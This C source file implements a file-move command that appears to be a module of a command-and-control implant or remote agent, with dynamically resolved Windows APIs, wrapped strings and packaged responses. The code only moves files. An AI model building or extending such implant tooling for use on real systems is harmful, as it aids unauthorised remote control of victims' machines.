#include "config.h"
#ifdef INCLUDE_CMD_MV

#include "commands.h"

VOID cmd_mv(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD src_len = 0, dst_len = 0;
    char* src = parser_string(args, &src_len);
    char* dst = parser_string(args, &dst_len);

    if (!src || !dst || src_len == 0 || dst_len == 0) {
        package_add_string(inst, response, XSTR("Usage: mv <src> <dst>"));
        response->is_error = TRUE;
        return;
    }

    char srcbuf[MAX_PATH] = {0}, dstbuf[MAX_PATH] = {0};
    es_memcpy(srcbuf, src, src_len < MAX_PATH-1 ? src_len : MAX_PATH-1);
    es_memcpy(dstbuf, dst, dst_len < MAX_PATH-1 ? dst_len : MAX_PATH-1);

    if (inst->Win32.MoveFileA(srcbuf, dstbuf)) {
        package_add_string(inst, response, XSTR("File moved"));
    } else {
        package_add_string(inst, response, XSTR("Failed to move file"));
        response->is_error = TRUE;
    }
}

#endif
